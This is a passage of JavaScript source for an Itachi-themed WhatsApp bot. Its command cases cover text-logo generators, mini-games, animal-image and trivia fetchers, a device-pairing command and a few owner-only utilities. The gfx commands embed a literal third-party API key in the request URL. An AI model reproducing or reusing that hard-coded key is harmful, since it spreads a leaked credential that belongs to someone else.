            text: `⚠️ *Hologram Projection Failed*\n\n` +
                  `❌ Error generating Free Create Text\n\n` +
                  `_"The dimensional rift has closed..."_`
        }, { quoted: m });
    }
}
break;

case "galaxystyle": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🪐 *Cosmic Seal Technique*\n\n` +
                  `❌ Please provide text for cosmic inscription!\n\n` +
                  `*Example:* ${prefix}galaxystyle Lumora Tech\n\n` +
                  `_"Seal your name in the fabric of the universe."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/galaxystyle?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🪐 *Cosmic Seal Complete*\n\n` +
                     `🌌 Galaxy logo forged: *${text}*\n\n` +
                     `_"Your legacy etched across planets and stars... timeless and infinite."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Cosmic Seal Failed*\n\n` +
                  `❌ Error generating Galaxy Style Logo\n\n` +
                  `_"The cosmos rejects the seal..."_`
        }, { quoted: m });
    }
}
break;

case "lighteffects": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `💡 *Chakra Luminescence Technique*\n\n` +
                  `❌ Please provide text to illuminate!\n\n` +
                  `*Example:* ${prefix}lighteffects Lumora Tech\n\n` +
                  `_"Channel your chakra into pure green light energy."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/lighteffects?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `💡 *Chakra Luminescence Active*\n\n` +
                     `💚 Green light radiates: *${text}*\n\n` +
                     `_"The glow of life force itself... pulsing with raw energy."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Luminescence Failed*\n\n` +
                  `❌ Error generating Light Effects\n\n` +
                  `_"The chakra light has dimmed..."_`
        }, { quoted: m });
    }
}
break;

case "numbattle": {
    const userRoll = Math.floor(Math.random() * 100) + 1;
    const botRoll = Math.floor(Math.random() * 100) + 1;
    
    let msg = `⚔️ *Shinobi Duel: Number Battle*\n\n`;
    msg += `🥷 Your roll: *${userRoll}*\n`;
    msg += `👁️ Itachi's roll: *${botRoll}*\n\n`;
    
    if (userRoll > botRoll) {
        msg += `🎉 *Victory!*\n_"You've surpassed me... impressive."_ - Itachi Uchiha`;
    } else if (userRoll < botRoll) {
        msg += `⚡ *Defeat!*\n_"You still have much to learn... train harder."_ - Itachi Uchiha`;
    } else {
        msg += `🤝 *Draw!*\n_"We are equals... for now."_ - Itachi Uchiha`;
    }
    
    await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
}
break;
case "coinbattle": {
    const userFlip = Math.random() < 0.5 ? "Heads" : "Tails";
    const botFlip = Math.random() < 0.5 ? "Heads" : "Tails";
    
    let msg = `🪙 *Coin Flip Duel*\n\n`;
    msg += `🥷 Your flip: *${userFlip}*\n`;
    msg += `👁️ Itachi's flip: *${botFlip}*\n\n`;
    
    if (userFlip === botFlip) {
        msg += `🎉 *Victory!*\n_"Luck favors you today... well done."_ - Itachi Uchiha`;
    } else {
        msg += `⚡ *Defeat!*\n_"Fate was not on your side... try again."_ - Itachi Uchiha`;
    }
    
    await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
}
break;

case "numberbattle": {
    const number = Math.floor(Math.random() * 50) + 1;
    
    if (!text) {
        return m.reply(
            `🎯 *Sharingan Prediction Challenge*\n\n` +
            `❌ You must predict a number between 1 and 50!\n\n` +
            `*Example:* ${prefix}numberbattle 25\n\n` +
            `_"Can you read my mind like the Sharingan reads movements?"_`
        );
    }
    
    const guess = parseInt(text);
    let msg = `🎯 *Prediction Challenge*\n\n`;
    msg += `🥷 Your prediction: *${guess}*\n`;
    msg += `👁️ Itachi's number: *${number}*\n\n`;
    
    if (guess === number) {
        msg += `🎉 *Perfect Prediction!*\n_"You've unlocked the Sharingan's foresight... impressive."_ - Itachi Uchiha`;
    } else if (guess > number) {
        msg += `⬇️ *Too High!*\n_"Your vision saw too far... aim lower."_ - Itachi Uchiha`;
    } else {
        msg += `⬆️ *Too Low!*\n_"Your perception is clouded... think higher."_ - Itachi Uchiha`;
    }
    
    await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
}
break;

case "math": {
    const a = Math.floor(Math.random() * 50) + 1;
    const b = Math.floor(Math.random() * 50) + 1;
    const answer = a + b;
    
    let msg = `🧮 *Shinobi Academy Test*\n\n`;
    msg += `➕ Solve this equation: *${a} + ${b}*\n\n`;
    msg += `Reply with: ${prefix}mathanswer <number>\n\n`;
    msg += `_"Even the greatest shinobi must master the basics... show me your knowledge."_ - Itachi Uchiha`;
    
    await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
    
    // Store answer to check later
}
break;

case "emojiquiz": {
    const quizzes = [
        { emoji: "🐍", answer: "snake" },
        { emoji: "🍎", answer: "apple" },
        { emoji: "🏎️", answer: "car" },
        { emoji: "🎸", answer: "guitar" },
        { emoji: "☕", answer: "coffee" },
        { emoji: "🦅", answer: "eagle" },
        { emoji: "🔥", answer: "fire" },
        { emoji: "🌙", answer: "moon" },
        { emoji: "⚔️", answer: "sword" },
        { emoji: "🐦‍⬛", answer: "crow" }
    ];
    const quiz = quizzes[Math.floor(Math.random() * quizzes.length)];
    
    let msg = `🧩 *Sharingan Pattern Recognition*\n\n`;
    msg += `👁️ Identify this symbol: *${quiz.emoji}*\n\n`;
    msg += `Reply with: ${prefix}emojianswer <your answer>\n\n`;
    msg += `_"The Sharingan sees all patterns... can you?"_ - Itachi Uchiha`;
    
    await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
    
    // Store the correct answer for checking
}
break;

case "dice": {
    const roll = Math.floor(Math.random() * 6) + 1;
    
    let msg = `🎲 *Dice of Destiny*\n\n`;
    msg += `⚡ You rolled: *${roll}*\n\n`;
    
    if (roll === 6) {
        msg += `_"Fortune smiles upon you... the highest roll."_ - Itachi Uchiha`;
    } else if (roll === 1) {
        msg += `_"Even the mightiest can fall... try again."_ - Itachi Uchiha`;
    } else {
        msg += `_"An average outcome... neither victory nor defeat."_ - Itachi Uchiha`;
    }
    
    await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
}
break;

case "rpsls": {
    if (!text) {
        return m.reply(
            `✊ *Ultimate Shinobi Battle*\n\n` +
            `❌ Choose your technique!\n\n` +
            `*Options:* rock, paper, scissors, lizard, spock\n\n` +
            `*Example:* ${prefix}rpsls spock\n\n` +
            `_"Five techniques... infinite combinations... choose wisely."_`
        );
    }
    
    const choices = ["rock", "paper", "scissors", "lizard", "spock"];
    const userChoice = text.toLowerCase();
    
    if (!choices.includes(userChoice)) {
        return m.reply(
            `❌ *Invalid Technique!*\n\n` +
            `Choose: rock, paper, scissors, lizard, or spock\n\n` +
            `_"Master the basics before attempting advanced jutsu."_`
        );
    }

    const botChoice = choices[Math.floor(Math.random() * choices.length)];

    const winMap = {
        rock: ["scissors", "lizard"],
        paper: ["rock", "spock"],
        scissors: ["paper", "lizard"],
        lizard: ["spock", "paper"],
        spock: ["scissors", "rock"]
    };

    let result = "";
    if (userChoice === botChoice) {
        result = "🤝 *Draw!*\n_\"Our techniques matched... we think alike.\"_ - Itachi Uchiha";
    } else if (winMap[userChoice].includes(botChoice)) {
        result = "🎉 *Victory!*\n_\"Your strategy surpassed mine... excellent.\"_ - Itachi Uchiha";
    } else {
        result = "⚡ *Defeat!*\n_\"I saw through your move... predictable.\"_ - Itachi Uchiha";
    }

    let msg = `✊ *Ultimate Shinobi Battle*\n\n`;
    msg += `🥷 Your technique: *${userChoice}*\n`;
    msg += `👁️ Itachi's technique: *${botChoice}*\n\n`;
    msg += result;

    await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
}
break;
case "coin": {
    const result = Math.random() < 0.5 ? "Heads" : "Tails";
    
    let msg = `🪙 *Coin of Fate*\n\n`;
    msg += `⚡ Result: *${result}*\n\n`;
    
    if (result === "Heads") {
        msg += `_"Heads... the path of light has been chosen."_ - Itachi Uchiha`;
    } else {
        msg += `_"Tails... the path of shadow awaits."_ - Itachi Uchiha`;
    }
    
    await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
}
break;

case "gamefact": {
    try {
        const res = await axios.get("https://www.freetogame.com/api/games");
        const games = res.data;
        const game = games[Math.floor(Math.random() * games.length)];
        
        let msg = `🎮 *Shinobi Gaming Archive*\n\n`;
        msg += `🕹️ *Game:* ${game.title}\n`;
        msg += `📂 *Genre:* ${game.genre}\n`;
        msg += `💻 *Platform:* ${game.platform}\n`;
        msg += `🔗 *More Info:* ${game.game_url}\n\n`;
        msg += `_"Even shinobi need rest... try this game."_ - Itachi Uchiha`;
        
        await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch (e) {
        console.error("GAMEFACT ERROR:", e);
        m.reply(
            `❌ *Archive Access Failed*\n\n` +
            `Failed to retrieve game information.\n\n` +
            `_"The database is sealed... try again later."_`
        );
    }
}
break;

case "fox": {
    try {
        const res = await axios.get("https://randomfox.ca/floof/");
        const img = res.data?.image;
        
        if (!img) {
            return m.reply(
                `❌ *Summon Failed*\n\n` +
                `Could not summon a fox.\n\n` +
                `_"The fox spirit does not answer..."_`
            );
        }
        
        await rich.sendMessage(
            m.chat,
            { 
                image: { url: img }, 
                caption: `🦊 *Fox Summoning Technique*\n\n_"A cunning fox appears... observe its beauty."_ - Itachi Uchiha` 
            },
            { quoted: m }
        );
    } catch (e) {
        console.error("FOX ERROR:", e);
        m.reply(`❌ *Summoning Disrupted*\n\n_"The fox summoning has failed..."_`);
    }
}
break;

case "koala": {
    try {
        const res = await axios.get("https://some-random-api.ml/img/koala");
        const img = res.data?.link;
        
        if (!img) {
            return m.reply(
                `❌ *Summon Failed*\n\n` +
                `Could not summon a koala.\n\n` +
                `_"The koala spirit remains hidden..."_`
            );
        }
        
        await rich.sendMessage(
            m.chat,
            { 
                image: { url: img }, 
                caption: `🐨 *Koala Summoning Technique*\n\n_"A peaceful koala appears... tranquility incarnate."_ - Itachi Uchiha` 
            },
            { quoted: m }
        );
    } catch (e) {
        console.error("KOALA ERROR:", e);
        m.reply(`❌ *Summoning Disrupted*\n\n_"The koala summoning has failed..."_`);
    }
}
break;

case "bird": {
    try {
        const res = await axios.get("https://some-random-api.ml/img/birb");
        const img = res.data?.link;
        
        if (!img) {
            return m.reply(
                `❌ *Summon Failed*\n\n` +
                `Could not summon a bird.\n\n` +
                `_"The bird refuses to fly to me..."_`
            );
        }
        
        await rich.sendMessage(
            m.chat,
            { 
                image: { url: img }, 
                caption: `🐦 *Bird Summoning Technique*\n\n_"A free bird soars... witness its grace."_ - Itachi Uchiha` 
            },
            { quoted: m }
        );
    } catch (e) {
        console.error("BIRD ERROR:", e);
        m.reply(`❌ *Summoning Disrupted*\n\n_"The bird summoning has failed..."_`);
    }
}
break;

case "panda": {
    try {
        const res = await axios.get("https://some-random-api.ml/img/panda");
        const img = res.data?.link;
        
        if (!img) {
            return m.reply(
                `❌ *Summon Failed*\n\n` +
                `Could not summon a panda.\n\n` +
                `_"The panda spirit is elsewhere..."_`
            );
        }
        
        await rich.sendMessage(
            m.chat,
            { 
                image: { url: img }, 
                caption: `🐼 *Panda Summoning Technique*\n\n_"A gentle giant appears... strength and peace combined."_ - Itachi Uchiha` 
            },
            { quoted: m }
        );
    } catch (e) {
        console.error("PANDA ERROR:", e);
        m.reply(`❌ *Summoning Disrupted*\n\n_"The panda summoning has failed..."_`);
    }
}
break;

case "funfact": {
    try {
        const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
        const fact = res.data?.text || "Did you know? Bots are awesome!";
        
        let msg = `💡 *Shinobi Wisdom Archive*\n\n`;
        msg += `📜 ${fact}\n\n`;
        msg += `_"Knowledge is power... even the smallest fact can change destiny."_ - Itachi Uchiha`;
        
        await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch (e) {
        console.error("FUNFACT ERROR:", e);
        m.reply(
            `❌ *Wisdom Retrieval Failed*\n\n` +
            `Failed to access the knowledge archive.\n\n` +
            `_"The scrolls are sealed... try again."_`
        );
    }
}
break;
case "advice": {
    try {
        // Assuming there's an API call here to fetch advice
        // const res = await axios.get("https://api.adviceslip.com/advice");
        // const advice = res.data?.slip?.advice || "Always believe in yourself.";
        
        const res = await axios.get("https://api.adviceslip.com/advice");
        const advice = res.data?.slip?.advice || "Always believe in yourself.";
        
        let msg = `💡 *Itachi's Wisdom*\n\n`;
        msg += `📜 ${advice}\n\n`;
        msg += `_"Heed these words carefully... they may guide your path."_ - Itachi Uchiha`;
        
        await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch (e) {
        console.error("ADVICE ERROR:", e);
        m.reply(
            `❌ *Wisdom Unavailable*\n\n` +
            `Failed to retrieve advice.\n\n` +
            `_"Even the wisest sometimes fall silent... try again."_`
        );
    }
}
break;
case "guess": {
    const number = Math.floor(Math.random() * 10) + 1;
    
    if (!text) {
        return m.reply(
            `🎯 *Mind Reading Challenge*\n\n` +
            `❌ You must choose a number between 1 and 10!\n\n` +
            `*Example:* ${prefix}guess 7\n\n` +
            `_"Can you predict what the Sharingan sees?"_`
        );
    }
    
    const guess = parseInt(text);
    
    if (isNaN(guess) || guess < 1 || guess > 10) {
        return m.reply(
            `❌ *Invalid Number!*\n\n` +
            `Choose between 1 and 10.\n\n` +
            `_"Focus your mind... be precise."_`
        );
    }
    
    let msg = `🎯 *Mind Reading Duel*\n\n`;
    msg += `🥷 Your guess: *${guess}*\n`;
    msg += `👁️ Itachi's number: *${number}*\n\n`;
    
    if (guess === number) {
        msg += `🎉 *Perfect!*\n_"You read my mind... impressive Sharingan perception."_ - Itachi Uchiha`;
    } else {
        msg += `⚡ *Wrong!*\n_"You could not see through my thoughts... train your mind."_ - Itachi Uchiha`;
    }
    
    await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
}
break;

case "urban": {
    if (!text) {
        return m.reply(
            `📖 *Modern Language Archive*\n\n` +
            `❌ Provide a word to search!\n\n` +
            `*Example:* ${prefix}urban sus\n\n` +
            `_"Even ancient shinobi must learn modern tongue."_`
        );
    }
    
    try {
        const res = await axios.get(`https://api.urbandictionary.com/v0/define?term=${encodeURIComponent(text)}`);
        const defs = res.data?.list;
        
        if (!defs || !defs.length) {
            return m.reply(
                `❌ *Word Not Found*\n\n` +
                `No definition exists for this term.\n\n` +
                `_"This word is unknown... even to me."_`
            );
        }
        
        const top = defs[0];
        let msg = `📖 *Modern Language Archive*\n\n`;
        msg += `🔤 *Word:* ${top.word}\n\n`;
        msg += `📝 *Definition:* ${top.definition.substring(0, 500)}${top.definition.length > 500 ? '...' : ''}\n\n`;
        msg += `💬 *Example:* ${top.example.substring(0, 300)}${top.example.length > 300 ? '...' : ''}\n\n`;
        msg += `_"Knowledge of all languages... is the way of the wise."_ - Itachi Uchiha`;
        
        await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch (e) {
        console.error("URBAN ERROR:", e);
        m.reply(
            `❌ *Archive Access Failed*\n\n` +
            `Failed to fetch definition.\n\n` +
            `_"The modern scrolls are sealed..."_`
        );
    }
}
break;

case "moviequote": {
    try {
        const res = await axios.get("https://movie-quote-api.herokuapp.com/v1/quote/");
        const quote = res.data?.quote || "May the Force be with you.";
        const movie = res.data?.show || "Unknown";
        
        let msg = `🎬 *Cinema Wisdom*\n\n`;
        msg += `💬 _"${quote}"_\n\n`;
        msg += `🎥 — ${movie}\n\n`;
        msg += `_"Stories from other worlds... yet wisdom remains universal."_ - Itachi Uchiha`;
        
        await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch (e) {
        console.error("MOVIE QUOTE ERROR:", e);
        m.reply(
            `❌ *Cinema Archive Failed*\n\n` +
            `Failed to fetch movie quote.\n\n` +
            `_"The film reels are damaged..."_`
        );
    }
}
break;

case "triviafact": {
    try {
        const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
        const fact = res.data?.text || "Did you know? You're awesome!";
        
        let msg = `🧠 *Hidden Knowledge*\n\n`;
        msg += `📜 ${fact}\n\n`;
        msg += `_"Even useless knowledge can become useful... in the right moment."_ - Itachi Uchiha`;
        
        await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch (e) {
        console.error("TRIVIA FACT ERROR:", e);
        m.reply(
            `❌ *Knowledge Retrieval Failed*\n\n` +
            `Failed to fetch trivia.\n\n` +
            `_"The library is closed..."_`
        );
    }
}
break;

case "inspire": {
    try {
        const res = await axios.get("https://type.fit/api/quotes");
        const quotes = res.data;
        const q = quotes[Math.floor(Math.random() * quotes.length)];
        
        let msg = `🌟 *Words of Inspiration*\n\n`;
        msg += `💭 _"${q.text}"_\n\n`;
        msg += `— ${q.author || "Unknown"}\n\n`;
        msg += `_"Let these words guide you forward... as they once guided me."_ - Itachi Uchiha`;
        
        await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch (e) {
        console.error("INSPIRE ERROR:", e);
        m.reply(
            `❌ *Inspiration Unavailable*\n\n` +
            `Failed to fetch quote.\n\n` +
            `_"Even inspiration fades sometimes..."_`
        );
    }
}
break;

case "compliment": {
    try {
        const res = await axios.get("https://complimentr.com/api");
        const compliment = res.data?.compliment || "You are awesome!";
        
        let msg = `💖 *Words of Encouragement*\n\n`;
        msg += `✨ ${compliment}\n\n`;
        msg += `_"Remember your worth... you are stronger than you know."_ - Itachi Uchiha`;
        
        await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch (e) {
        console.error("COMPLIMENT ERROR:", e);
        m.reply(
            `❌ *Encouragement Failed*\n\n` +
            `Failed to fetch compliment.\n\n` +
            `_"But know this... you are valued."_`
        );
    }
}
break;
case "dog": {
    try {
        const res = await axios.get("https://dog.ceo/api/breeds/image/random");
        const img = res.data?.message;
        
        if (!img) {
            return m.reply(
                `❌ *Summon Failed*\n\n` +
                `Could not summon a dog.\n\n` +
                `_"The hound does not answer the call..."_`
            );
        }
        
        await rich.sendMessage(
            m.chat,
            { 
                image: { url: img }, 
                caption: `🐶 *Hound Summoning Technique*\n\n_"A loyal companion appears... faithful and true."_ - Itachi Uchiha` 
            },
            { quoted: m }
        );
    } catch (e) {
        console.error("DOG ERROR:", e);
        m.reply(`❌ *Summoning Disrupted*\n\n_"The hound summoning has failed..."_`);
    }
}
break;

case 'pair': {
    await rich.sendMessage(m.chat, {react: {text: '🖇️', key: m.key}});
    
    if (!q) {
        return reply(
            `🔗 *Device Linking Technique*\n\n` +
            `❌ Please enter a valid number!\n\n` +
            `*Format:* ${prefix}pair 234xxxxxxx\n\n` +
            `_"Link your device to access the full power."_`
        );
    }

    target = text.split("|")[0];
    sjid = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : target.replace(/[^0-9]/g,'') + "@s.whatsapp.net";

    var contactInfo = await rich.onWhatsApp(sjid);
    if (contactInfo.length === 0) {
        return reply(
            `❌ *Number Not Found*\n\n` +
            `This number is not registered on WhatsApp.\n\n` +
            `_"The target does not exist in this realm..."_`
        );
    }

    const startpairing = require('./pair.js');
    await startpairing(sjid);
    await sleep(4000);

    const cu = fs.readFileSync('./richstore/pairing/pairing.json', 'utf-8');
    const cuObj = JSON.parse(cu);

    // Send just the code first
    await rich.sendMessage(from, { text: `🔴 *Code:* ${cuObj.code}` }, { quoted: m });

    // Send the instructions next
    const instructions = `
*[🔗 Pairing Code Generated ✅]*

🆔 *Activation Code:* ${cuObj.code}

*Steps to Link Device:* 📑
1️⃣ Open WhatsApp
2️⃣ Go to Linked Devices
3️⃣ Select Link Device
4️⃣ Enter this code

_"Follow the path carefully... connection awaits."_ - Itachi Uchiha`;

    await rich.sendMessage(from, { text: instructions }, { quoted: m });
}
break;

case "cat": {
    try {
        const res = await axios.get("https://api.thecatapi.com/v1/images/search");
        const img = res.data[0]?.url;
        
        if (!img) {
            return m.reply(
                `❌ *Summon Failed*\n\n` +
                `Could not summon a cat.\n\n` +
                `_"The feline spirit remains elusive..."_`
            );
        }
        
        await rich.sendMessage(
            m.chat,
            { 
                image: { url: img }, 
                caption: `🐱 *Cat Summoning Technique*\n\n_"A mysterious cat appears... independent and graceful."_ - Itachi Uchiha` 
            },
            { quoted: m }
        );
    } catch (e) {
        console.error("CAT ERROR:", e);
        m.reply(`❌ *Summoning Disrupted*\n\n_"The cat summoning has failed..."_`);
    }
}
break;

case "rps": {
    if (!text) {
        return m.reply(
            `✊ *Shinobi Hand Battle*\n\n` +
            `❌ Choose your technique!\n\n` +
            `*Options:* rock, paper, scissors\n\n` +
            `*Example:* ${prefix}rps rock\n\n` +
            `_"Three techniques... one victor."_`
        );
    }
    
    const choices = ["rock", "paper", "scissors"];
    const userChoice = text.toLowerCase();
    
    if (!choices.includes(userChoice)) {
        return m.reply(
            `❌ *Invalid Technique!*\n\n` +
            `Choose: rock, paper, or scissors\n\n` +
            `_"Master the basics first."_`
        );
    }

    const botChoice = choices[Math.floor(Math.random() * choices.length)];

    let result = "";
    if (userChoice === botChoice) {
        result = "🤝 *Draw!*\n_\"Our techniques matched... we think alike.\"_ - Itachi Uchiha";
    } else if (
        (userChoice === "rock" && botChoice === "scissors") ||
        (userChoice === "paper" && botChoice === "rock") ||
        (userChoice === "scissors" && botChoice === "paper")
    ) {
        result = "🎉 *Victory!*\n_\"You predicted my move... well done.\"_ - Itachi Uchiha";
    } else {
        result = "⚡ *Defeat!*\n_\"I saw through your strategy... predictable.\"_ - Itachi Uchiha";
    }

    let msg = `✊ *Shinobi Hand Battle*\n\n`;
    msg += `🥷 Your technique: *${userChoice}*\n`;
    msg += `👁️ Itachi's technique: *${botChoice}*\n\n`;
    msg += result;

    await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
}
break;

case "8ball": {
    const answers = [
        "It is certain ✅",
        "Without a doubt ✅",
        "You may rely on it ✅",
        "The Sharingan confirms this ✅",
        "Destiny says yes ✅",
        "Ask again later 🤔",
        "Cannot predict now 🤔",
        "The future is unclear 🤔",
        "Don't count on it ❌",
        "My sources say no ❌",
        "Very doubtful ❌",
        "Fate says no ❌"
    ];
    
    if (!text) {
        return m.reply(
            `🎱 *Oracle of Destiny*\n\n` +
            `❌ Ask me a question!\n\n` +
            `*Example:* ${prefix}8ball Will I succeed?\n\n` +
            `_"The future reveals itself to those who ask..."_`
        );
    }
    
    const answer = answers[Math.floor(Math.random() * answers.length)];
    
    let msg = `🎱 *Oracle of Destiny*\n\n`;
    msg += `❓ *Question:* ${text}\n\n`;
    msg += `🔮 *Answer:* ${answer}\n\n`;
    msg += `_"The oracle has spoken... heed its wisdom."_ - Itachi Uchiha`;
    
    await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
}
break;

case "trivia": {
    try {
        const res = await axios.get("https://opentdb.com/api.php?amount=1&type=multiple");
        const trivia = res.data.results[0];
        const options = [...trivia.incorrect_answers, trivia.correct_answer].sort(() => Math.random() - 0.5);
        
        let msg = `🧠 *Shinobi Academy Test*\n\n`;
        msg += `❓ ${trivia.question}\n\n`;
        msg += `*Options:*\n${options.map((o,i)=>`${i+1}. ${o}`).join("\n")}\n\n`;
        msg += `_"Test your knowledge... prove your worth."_ - Itachi Uchiha`;
        
        await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
        // Store trivia.correct_answer if you want to check the user's answer later
    } catch (e) {
        console.error("TRIVIA ERROR:", e);
        m.reply(
            `❌ *Academy Test Failed*\n\n` +
            `Failed to fetch trivia question.\n\n` +
            `_"The exam papers are lost..."_`
        );
    }
}
break;
case "meme": {
    try {
        const res = await axios.get("https://meme-api.com/gimme");
        const meme = res.data;
        
        if (!meme?.url) {
            return m.reply(
                `❌ *Humor Scroll Missing*\n\n` +
                `Could not fetch a meme.\n\n` +
                `_"Even laughter has its limits..."_`
            );
        }
        
        await rich.sendMessage(
            m.chat,
            { 
                image: { url: meme.url }, 
                caption: `😂 *Moment of Levity*\n\n${meme.title}\n\n_"Even shinobi need humor... to stay sane."_ - Itachi Uchiha` 
            },
            { quoted: m }
        );
    } catch (e) {
        console.error("MEME ERROR:", e);
        m.reply(
            `❌ *Humor Failed*\n\n` +
            `Failed to fetch meme.\n\n` +
            `_"The joke scrolls are sealed..."_`
        );
    }
}
break;

case 'gfx':
case 'gfx2':
case 'gfx3':
case 'gfx4':
case 'gfx5':
case 'gfx6':
case 'gfx7':
case 'gfx8':
case 'gfx9':
case 'gfx10':
case 'gfx11':
case 'gfx12': {
    const [text1, text2] = text.split('|').map(v => v.trim());
    
    if (!text1 || !text2) {
        return reply(
            `🎨 *Artistic Seal Technique*\n\n` +
            `❌ Provide two texts separated by |\n\n` +
            `*Example:* ${prefix + command} Lumora | Tech\n\n` +
            `_"Two words... one masterpiece."_`
        );
    }

    reply(
        `🎨 *Creating Artistic Seal...*\n\n` +
        `🔤 First Inscription: ${text1}\n` +
        `🔡 Second Inscription: ${text2}\n\n` +
        `⏳ The art takes form... please wait!\n\n` +
        `_"Patience yields perfection."_ - Itachi Uchiha`
    );

    try {
        const style = command.toUpperCase();
        const apiUrl = `https://api.nexoracle.com/image-creating/${command}?apikey=d0634e61e8789b051e&text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`;

        await sendImage(
            apiUrl, 
            `🎨 *Lumora Tech - ${style} Style*\n\n` +
            `🔤 First: ${text1}\n` +
            `🔡 Second: ${text2}\n\n` +
            `_"Art forged in the flames of creativity."_ - Itachi Uchiha`
        );
    } catch (err) {
        console.error(err);
        reply(
            `❌ *Artistic Seal Failed*\n\n` +
            `Failed to generate ${command.toUpperCase()} image.\n\n` +
            `_"The artistic technique has backfired..."_`
        );
    }
    break;
}

case 'getpp': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"This power is reserved for the village leader."_`
        );
    }
    
    let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net';
    let ghosst = userss;
    
    try {
        var ppuser = await rich.profilePictureUrl(ghosst, 'image');
    } catch (err) {
        var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60';
    }
    
    await rich.sendMessage(
        from, 
        { 
            image: { url: ppuser },
            caption: `👁️ *Identity Revealed*\n\n_"The Sharingan sees all... even hidden faces."_ - Itachi Uchiha`
        }, 
        { quoted: m }
    );
}
break;

case 'yts': 
case 'ytsearch': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"This search power is restricted."_`
        );
    }
    
    if (!text) {
        return reply(
            `🔍 *YouTube Archive Search*\n\n` +
            `❌ Provide search query!\n\n` +
            `*Example:* ${prefix + command} anime openings\n\n` +
            `_"Search the archives... knowledge awaits."_`
        );
    }
    
    let yts = require("yt-search");
    let search = await yts(text);
    let teks = `🔍 *YouTube Archive Search*\n\n📺 Results for: *${text}*\n\n`;
    let no = 1;
    
    for (let i of search.all) {
        teks += `${themeemoji} *No:* ${no++}\n`;
        teks += `${themeemoji} *Type:* ${i.type}\n`;
        teks += `${themeemoji} *Video ID:* ${i.videoId}\n`;
        teks += `${themeemoji} *Title:* ${i.title}\n`;
        teks += `${themeemoji} *Views:* ${i.views}\n`;
        teks += `${themeemoji} *Duration:* ${i.timestamp}\n`;
        teks += `${themeemoji} *Uploaded:* ${i.ago}\n`;
        teks += `${themeemoji} *URL:* ${i.url}\n\n`;
        teks += `━━━━━━━━━━━━━━━\n\n`;
    }
    
    teks += `_"The archive has revealed its secrets."_ - Itachi Uchiha`;
    
    rich.sendMessage(
        m.chat, 
        { 
            image: { url: search.all[0].thumbnail },  
            caption: teks 
        }, 
        { quoted: m }
    );
}
break;

case 'animewlp': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"These sacred images are for the leader's eyes only."_`
        );
    }
    
    try {
        waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`);
        
        await rich.sendMessage(
            m.chat, 
            { 
                image: { url: waifudd.data.url }, 
                caption: `🎨 *Anime Art Scroll*\n\n_"Beauty preserved in eternal form... admire the artistry."_ - Itachi Uchiha`
            }, 
            { quoted: m }
        ).catch(err => {
            return reply(
                `❌ *Art Retrieval Failed*\n\n` +
                `Error fetching wallpaper.\n\n` +
                `_"The art scrolls are damaged..."_`
            );
        });
    } catch (e) {
        return reply(
            `❌ *Art Scroll Missing*\n\n` +
            `Failed to fetch anime wallpaper.\n\n` +
            `_"The sacred art cannot be accessed..."_`
        );
    }
}
break;

case 'resetlink': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can use this command.\n\n` +
            `_"Only the village leader can reset the barrier."_`
        );
    }
    
    if (!m.isGroup) {
        return reply(
            `⚠️ *Group Only*\n\n` +
            `This technique only works in groups.\n\n` +
            `_"A village needs people to protect."_`
        );
    }
    
    if (!isBotAdmins) {
        return reply(
            `❌ *Insufficient Authority*\n\n` +
            `I must be an admin first.\n\n` +
            `_"Grant me authority to execute this technique."_`
        );
    }
    
    if (!isAdmins) {
        return reply(
            `🚫 *Admin Only*\n\n` +
            `Only group admins can use this.\n\n` +
            `_"Leadership has its privileges."_`
        );
    }
    
    await rich.groupRevokeInvite(m.chat);
    reply(
        `🔄 *Invitation Link Reset*\n\n` +
        `✅ Group invitation link has been reset.\n\n` +
        `_"The old path is sealed... a new one opens."_ - Itachi Uchiha`
    );
